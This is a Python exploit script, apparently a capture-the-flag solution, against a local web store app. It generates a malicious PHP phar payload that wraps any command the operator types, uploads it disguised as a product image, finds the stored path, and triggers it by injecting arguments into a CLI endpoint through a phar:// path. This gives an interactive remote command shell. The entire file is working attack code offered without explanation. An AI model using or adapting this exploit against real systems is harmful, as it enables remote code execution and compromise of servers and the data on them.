import requests
from bs4 import BeautifulSoup
import subprocess
import logging

HOST = "http://127.0.0.1:1337"

logging.basicConfig(level=logging.INFO)

def generate_payload(command):
    try:
        subprocess.run(["php", "-d", "phar.readonly=0", "gen.php", command], check=True)
        return True
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to generate payload: {e}")
        return False

def upload_product():
    try:
        with open("image.jpg", 'rb') as file:
            files = {"image": file, "title": (None, "Doom"), "description": (None, "got doomed")}
            response = requests.post(HOST + "/addProduct", files=files)
            if response.status_code == 200:
                return True
    except FileNotFoundError:
        logging.error("File not found.")
    except Exception as e:
        logging.error(f"Upload failed: {e}")
    return False

def get_image():
    try:
        response = requests.get(HOST + "/product")
        soup = BeautifulSoup(response.content, 'html.parser')
        cards = soup.find_all('div', class_='card custom-card')
        latest_image_url = None
        for card in cards:
            img_element = card.find('img', class_='card-img-top')
            if img_element:
                latest_image_url = img_element['src']
        return latest_image_url
    except Exception as e:
        logging.error(f"Failed to retrieve image: {e}")
        return None

def trigger(payload):
    try:
        r = requests.get(HOST + f"/cli/cli.php?+-m+import+-c+phar:///www/{payload}/test.conf+-f+/etc/passwd")
        return r.content.decode()
    except Exception as e:
        logging.error(f"Trigger failed: {e}")
        return None

def exploit():
    try:
        while True:
            command = input("Command: ")
            if command.lower() == "exit":
                break
            if generate_payload(command):
                if upload_product():
                    payload = get_image()
                    if payload:
                        output = trigger(payload)
                        if output:
                            print(output)
                            continue
            print("Failed to execute command")
    except KeyboardInterrupt:
        logging.info("Exiting...")

if __name__ == "__main__":
    exploit()
